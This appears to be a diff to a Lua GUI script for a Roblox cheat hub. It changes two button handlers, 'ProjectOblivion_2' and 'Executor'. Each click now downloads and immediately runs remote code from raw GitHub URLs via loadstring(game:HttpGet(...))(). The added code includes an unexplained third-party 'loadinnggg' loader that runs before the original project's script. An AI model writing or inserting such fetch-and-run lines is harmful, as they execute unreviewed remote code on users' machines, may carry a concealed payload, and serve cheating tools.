@@ -71,6 +71,8 @@ ProjectOblivion_2.TextScaled = true
 ProjectOblivion_2.TextSize = 14.000
 ProjectOblivion_2.TextWrapped = true
 ProjectOblivion_2.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Sashkotashko420/mainthing/main/loadinnggg'))()
+	wait(4)
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/projectoblivionmain/mainmainmain/main/mainmainmainmain'))()
 end)
 
@@ -88,7 +90,9 @@ Executor.TextScaled = true
 Executor.TextSize = 14.000
 Executor.TextWrapped = true
 Executor.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet(''))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Sashkotashko420/mainthing/main/loadinnggg'))()
+	wait(4)
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Sashkotashko420/mainthing/main/ssussyyyyexecutorrr'))()
 end)
 
 UICorner_3.Parent = Executor
